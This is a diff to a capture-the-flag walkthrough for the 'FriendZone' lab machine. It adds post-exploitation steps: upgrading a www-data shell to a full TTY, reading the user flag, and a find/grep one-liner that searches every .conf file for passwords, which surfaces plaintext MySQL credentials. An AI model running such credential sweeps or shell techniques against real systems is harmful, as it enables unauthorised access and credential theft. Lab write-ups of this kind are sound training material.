@@ -242,13 +242,28 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
 
-**Get User Flag**
+### Get User Flag
 
-Escape limited shell
+First we need to stabilize the shell
+
+1. Escape limited shell
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
+2. Give access to `clear` command and more
+```
+export TERM=xterm
+```
+
+3. Then background the shell with CTRL+Z
+
+4. In your terminal, use the command below.
+```
+stty raw -echo; fg
+```
+
+Flag is ==f61334c76f61015bf617a7410732063b==
 ```
 www-data@FriendZone:/$ find /home/friend -name *.txt 2>/dev/null
 /home/friend/user.txt
@@ -256,5 +271,39 @@ www-data@FriendZone:/$ cat /home/friend/user.txt
 f61334c76f61015bf617a7410732063b
 www-data@FriendZone:/$ 
 
+```
+
+### User Password
+
+I used the hint to find the password. However, you can also execute the following to find it
+```
+find / -name "*.conf" -exec grep -Hi pass {} \; 2>/dev/null
+```
+
+Password is located in `/var/www/mysql_data.conf`
+```
+db_pass=Agpyu12!0.213$
+```
+
+In that config file we'll find the database user and the db they can log into:
+
+```
+www-data@FriendZone:/$ cat /var/www/mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+www-data@FriendZone:/$ 
+```
+
+
+
+
+I also found a password for the backend samba database, located in `/var/lib/ucf/cache/`
+```
+tdbsam
 ```
 
